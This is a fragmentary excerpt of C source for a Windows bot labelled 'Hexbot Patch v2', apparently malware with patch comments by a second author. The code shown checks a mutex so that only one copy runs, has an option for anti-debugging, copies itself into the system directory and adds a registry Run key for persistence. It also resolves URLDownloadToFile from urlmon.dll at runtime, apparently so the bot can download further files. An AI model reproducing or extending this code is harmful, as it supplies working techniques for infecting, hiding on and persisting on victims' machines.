...
/***************************************************
*				Hexbot Patch v2
*		Original created by "Nibble".
*			Patched by Bull Moose.
***************************************************/

typedef HRESULT (__stdcall *UDTF)(LPUNKNOWN,LPCTSTR,LPCTSTR,DWORD,int);
UDTF URLDownloadToFile;	// Added by Bull Moose, to dynamically get URLDownloadToFile's address\
Later it gets the address by using LoadLibrary for urlmon.dll then GetProcAddress\
This shortens the size of the binary(No linking to urlmon), and in the case of MinGW, I had to do this. See line 1976.
...
int main(void)					
{
#ifndef ALLOW_MULTIPLES
	CreateMutex(NULL,0,BotMutex);
	if(GetLastError()==ERROR_ALREADY_EXISTS) return 1;
#endif
#ifndef NO_ANTI_DEBUGGING
...
#ifndef NO_CPY_STARTUP
	char MyPath[256], SysPath[256];
	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
	GetSystemDirectory(SysPath,sizeof(SysPath));
	strcat(SysPath,SystemEXE);
	CopyFile(MyPath,SysPath,FALSE);

	HKEY key32;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE,&key32);
	RegSetValueEx(key32,RegistryRun,0,REG_SZ,SysPath,strlen(SysPath));
	RegCloseKey(key32);
#endif
...
HMODULE urlmon_dll = LoadLibrary("urlmon.dll");
URLDownloadToFile = (UDTF)GetProcAddress(urlmon_dll,"URLDownloadToFileA");
